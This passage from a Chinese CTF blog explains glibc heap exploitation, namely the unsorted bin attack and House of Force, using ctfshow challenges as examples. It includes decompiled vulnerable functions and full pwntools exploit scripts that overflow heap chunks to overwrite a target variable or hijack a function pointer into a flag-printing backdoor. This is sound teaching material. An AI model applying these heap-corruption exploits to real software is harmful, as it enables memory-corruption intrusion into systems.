class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      edit_heap();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( heaparray[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    v2 = atoi(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input(heaparray[v1], v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>edit函数没检查修改的chunk的大小可以进行对下一个堆的覆盖。</p>
<p>攻击思路：</p>
<ol>
<li>先申请三个堆块，chunk0,chunk1,chunk2; chunk0用来改chunk1,chunk2用来隔开top_chunk</li>
<li>将chunk1的bk改成magic的地址-0x10(bk指向的是chunk的其实地址，我们要把magic的地址放入data的位置)</li>
<li>我们把chunk1放入unsorted bin，然后再申请一样大小的堆，就可以将magic改成一个很大的值。</li>
</ol>
<p>攻击原理：利用 <code>malloc</code> 从 Unsorted Bin 中取出一个 chunk（称为 <code>victim</code>）时，对 Unsorted Bin 双向链表进行的拆链操作。通过篡改 <code>victim-&gt;bk</code> 指针，欺骗分配器，让它错误地更新链表，从而将 <code>target</code> 地址误认为是链表中的一个合法 chunk 的起始位置（<code>chunk header</code>），并将 main_arena 中指向 Unsorted Bin 的指针写入这个“伪造 chunk”的 <code>fd</code> 字段。</p>
<p>这里附一个关键步骤详解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">1.准备 Victim Chunk 并放入 Unsorted Bin:</span><br><span class="line"></span><br><span class="line">申请一个稍大的 chunk（例如大于 fastbin 的最大值）。</span><br><span class="line"></span><br><span class="line">释放这个 chunk，使其进入 Unsorted Bin。</span><br><span class="line"></span><br><span class="line">重要前提： 在攻击发生的时刻，Unsorted Bin 中最好只有这一个 chunk（victim），或者有多个大小完全相同的 chunk（且攻击目标是其中之一）。这样 victim-&gt;fd 和 victim-&gt;bk 都会直接指向 main_arena 中管理 Unsorted Bin 的头部指针 bin-&gt;bk 和 bin-&gt;fd，而不是其他 chunk。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.篡改 Victim-&gt;bk:</span><br><span class="line"></span><br><span class="line">利用堆漏洞（如 UAF、堆溢出）修改 victim chunk 的 bk 指针。</span><br><span class="line"></span><br><span class="line">将 victim-&gt;bk 设置为 target - 0x10 (在 64 位系统上) 或 target - 0x8 (在 32 位系统上)。</span><br><span class="line"></span><br><span class="line">为什么是 target - 0x10 (64位)?</span><br><span class="line"></span><br><span class="line">Unsorted Bin 是一个管理 空闲 chunk 的双向链表。</span><br><span class="line"></span><br><span class="line">链表中每个节点的指针（fd 和 bk）指向的是 其他空闲 chunk 的 header 起始地址 (chunk header)。</span><br><span class="line"></span><br><span class="line">chunk header 在 64 位系统上通常是 0x10 字节（包含 size/prev_size 和 flags 字段）。</span><br><span class="line"></span><br><span class="line">我们希望 malloc 返回后，target 地址处被写入那个巨大的值（即 target 被当作用户数据区 mem 的起始地址）。</span><br><span class="line"></span><br><span class="line">为了让分配器认为 target 地址处有一个合法的 chunk，我们需要在 target - 0x10 处伪造一个 chunk header。这样：</span><br><span class="line"></span><br><span class="line">伪造 chunk 的 header 地址 = target - 0x10</span><br><span class="line"></span><br><span class="line">伪造 chunk 的用户数据区 (mem) 地址 = (target - 0x10) + 0x10 = target</span><br><span class="line"></span><br><span class="line">所以，我们将 victim-&gt;bk 设置为 target - 0x10，就是在告诉分配器：“Unsorted Bin 中，victim 的下一个空闲 chunk（后向 chunk）的 header 位于 target - 0x10”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.触发分配 (malloc) - 拆链操作:</span><br><span class="line"></span><br><span class="line">申请一个大小合适的 chunk（通常是和 victim 大小相同或满足 victim 分割条件的 size）。这会触发分配器从 Unsorted Bin 中取出 victim。</span><br><span class="line"></span><br><span class="line">分配器执行标准的双向链表移除操作 (拆链)：</span><br><span class="line"></span><br><span class="line">c</span><br><span class="line">// 伪代码表示关键的拆链步骤 (基于 glibc 源码简化)</span><br><span class="line">bck = victim-&gt;bk; // 步骤 (a)：bck = target - 0x10</span><br><span class="line">bin-&gt;bk = bck;    // 步骤 (a)：Unsorted Bin 的 bk 指针更新为 target - 0x10</span><br><span class="line">bck-&gt;fd = bin;    // 步骤 (b)：关键写入发生在这里！</span><br><span class="line">步骤 (a): bin-&gt;bk = victim-&gt;bk = target - 0x10</span><br><span class="line"></span><br><span class="line">分配器将 Unsorted Bin 的尾部指针 (bin-&gt;bk) 更新为 victim-&gt;bk 的值，也就是 target - 0x10。这意味着分配器现在认为 Unsorted Bin 中最后一个 chunk 的 header 在 target - 0x10。</span><br><span class="line"></span><br><span class="line">步骤 (b): bck-&gt;fd = bin</span><br><span class="line"></span><br><span class="line">bck 就是上一步得到的 target - 0x10。</span><br><span class="line"></span><br><span class="line">bck-&gt;fd 表示“位于 target - 0x10 的这个伪造 chunk”的 fd 指针。</span><br><span class="line"></span><br><span class="line">bin 是 main_arena 中管理 Unsorted Bin 的头部指针地址（它是一个很大的 libc 地址）。</span><br><span class="line"></span><br><span class="line">这是攻击的核心写入点！ 分配器将 bin (那个很大的 libc 地址) 写入到 (target - 0x10) + offset_of(fd) 的位置。</span><br><span class="line"></span><br><span class="line">在 chunk 结构中，fd 位于 header 起始地址偏移 0x10 字节处（紧跟在 size 字段之后）。</span><br><span class="line"></span><br><span class="line">写入地址 = (target - 0x10) + 0x10 = target。</span><br><span class="line"></span><br><span class="line">因此，巨大的值 bin (main_arena 地址) 被写入了 target 地址处。</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">count=<span class="number">1</span></span><br><span class="line">gdb_flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> count==<span class="number">0</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28127</span>)</span><br><span class="line"><span class="keyword">if</span> gdb_flag==<span class="number">1</span>:</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">x</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content of heap:&#x27;</span>)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,data</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))   </span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content of heap : &#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">target=<span class="number">0x6020a0</span></span><br><span class="line">payload=<span class="string">b&#x27;x&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(target-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">cmd(<span class="number">114514</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(r)</span><br><span class="line">pause <span class="comment">#可以加这个调试看看，这里就不演示了</span></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/16/house-of-force/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/07/16/house-of-force/" class="post-title-link" itemprop="url">house of force</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-07-16 15:32:33" itemprop="dateCreated datePublished" datetime="2025-07-16T15:32:33+08:00">2025-07-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 20:36:56" itemprop="dateModified" datetime="2025-09-23T20:36:56+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/heap/" itemprop="url" rel="index"><span itemprop="name">heap</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><p>原理：</p>
<ol>
<li>核心目标： 将 Top Chunk 移动到任意可控地址，从而允许后续从该地址分配“堆块”，实现对该地址及其之后内存的任意读写。</li>
<li>攻击原理： 利用 <code>malloc</code> 在从 Top Chunk 分配内存时，仅根据用户请求的大小 <code>nb</code> 和当前 Top Chunk 的大小 <code>top_size</code> 来更新 Top Chunk 位置的机制（<code>new_top = old_top + nb</code>）。通过篡改 Top Chunk 的 <code>size</code> 字段为一个极大值（通常是 <code>-1</code>，即 <code>0xFFFFFFFFFFFFFFFF</code>），并精心构造一个超大的 <code>nb</code>，使得计算出的 <code>new_top</code> 指向攻击者期望的目标地址。</li>
<li>使用前提：<ol>
<li>堆块大小控制自由： 攻击者能够申请任意大小的堆块（<code>malloc(nb)</code> 中的 <code>nb</code> 可以非常大）。</li>
<li>Top Chunk Size 篡改： 存在漏洞（通常是堆溢出）允许攻击者覆盖 Top Chunk 的 <code>size</code> 字段，将其修改为一个极大的值（例如 <code>0xFFFFFFFFFFFFFFFF</code>）。</li>
<li>地址信息已知（通常需要）：攻击者需要知道：<ul>
<li>当前 Top Chunk 的地址 (<code>old_top</code>):用于计算所需的偏移量。</li>
<li>目标地址 (<code>target_addr</code>): 希望将 Top Chunk 移动到的地址。</li>
</ul>
</li>
<li>特殊情况 - 仅需偏移量： 如果目标地址 (<code>target_addr</code>) 本身位于堆内存区域内（例如，想要覆盖堆上的某个特定结构体或指针），那么攻击者<strong>不一定</strong>需要知道 <code>old_top</code> 和 <code>target_addr</code> 的绝对地址。只需要知道它们之间的偏移量 (<code>offset = target_addr - old_top</code>) 即可。这在某些堆布局已知或可控的场景下是可行的。</li>
</ol>
</li>
</ol>
<p>例题：</p>
<p>ctfshow pwn143</p>
<p>edit()存在漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+18h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the index:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    v1 = atoi(buf);</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)&amp;unk_6020A8 + <span class="number">2</span> * v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of name:&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, nptr, <span class="number">8uLL</span>);</span><br><span class="line">      v2 = atoi(nptr);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new name:&quot;</span>);</span><br><span class="line">      *(_BYTE *)(*((_QWORD *)&amp;unk_6020A8 + <span class="number">2</span> * v1) + (<span class="type">int</span>)read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;unk_6020A8 + <span class="number">2</span> * v1), v2)) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invaild index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nothing here~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个edit函数没有检查输入长度的大小，完全由自己决定，存在堆溢出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">fffffffffffffffffffffffffffffffffflag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, buf, <span class="number">0x64u</span>LL);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在后门函数。</p>
<p>所以我利用堆溢出，把top_chunk的size改成极大值，再把v4[1]的地址换成后门函数的地址就可以得到flag了，(为什么是v4[1]呢，因为</p>
<p>执行edit前都会执行v4[1]，把v4[1]的地址换成后门函数的地址，就可以执行后门函数了)。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置运行环境</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三种连接方式，按需启用</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28219</span>)  <span class="comment"># 远程连接</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)  # 本地运行</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./pwn&#x27;, &#x27;b main&#x27;)  # GDB调试</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载二进制文件</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># 获取flag符号的地址（目标覆盖地址）</span></span><br><span class="line">flag_addr = elf.sym[<span class="string">&#x27;fffffffffffffffffffffffffffffffffflag&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length, content</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the length:&#x27;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the name:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, length, content</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the length of name:&#x27;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the new name:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_prog</span>():</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 漏洞利用流程 =====</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 创建初始chunk</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;chunk0&#x27;</span>)  <span class="comment"># 分配0x40大小的chunk（含头部）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 修改top chunk大小</span></span><br><span class="line"><span class="comment"># 覆盖top chunk的size字段为极大值(0xFFFFFFFFFFFFFFFF)</span></span><br><span class="line"><span class="comment"># 布局: [chunk0数据(0x30)] + [填充(0x8)] + [size字段(0x8)]</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 计算负偏移实现指针回退</span></span><br><span class="line"><span class="comment"># 偏移计算: flag_addr - (top_chunk_addr + 0x10)</span></span><br><span class="line"><span class="comment"># 实际计算: -(0x60 + 0x8 + 0xf) = -0x77 (需根据实际调试调整)</span></span><br><span class="line">offset = -(<span class="number">0x60</span> + <span class="number">0x8</span> + <span class="number">0xf</span>)</span><br><span class="line">add(offset, <span class="string">&#x27;trigger&#x27;</span>)  <span class="comment"># 申请负大小chunk触发整数溢出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 在目标地址分配chunk</span></span><br><span class="line"><span class="comment"># 此时top chunk指针已回退到flag_addr附近</span></span><br><span class="line"><span class="comment"># 分配0x10大小的chunk，其数据区将位于flag_addr处</span></span><br><span class="line">add(<span class="number">0x10</span>, p64(flag_addr)*<span class="number">2</span>)  <span class="comment"># 用flag地址覆盖目标内存</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 触发flag读取</span></span><br><span class="line">exit_prog()  <span class="comment"># 退出程序（可能触发flag输出）</span></span><br><span class="line"></span><br><span class="line"><span 